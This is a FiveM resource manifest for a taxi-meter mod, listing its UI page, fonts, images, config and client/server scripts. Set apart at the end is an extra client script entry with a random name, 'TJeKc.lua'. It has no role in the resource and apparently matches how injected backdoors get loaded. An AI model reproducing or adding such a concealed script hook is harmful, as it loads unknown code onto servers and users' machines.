resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

version '1.0.1'

ui_page "nui/meter.html"

files {
	"nui/digital-7.regular.ttf",
	"nui/meter.html",
	"nui/meter.css",
	"nui/meter.js",
	'nui/img/phone.png',
	'nui/img/fare1.png',
	'nui/img/fare2.png'
}

client_scripts{
  'config.lua',
  'client/main.lua'
}

server_scripts{
  'config.lua',
  'server/main.lua'
}



client_script "TJeKc.lua"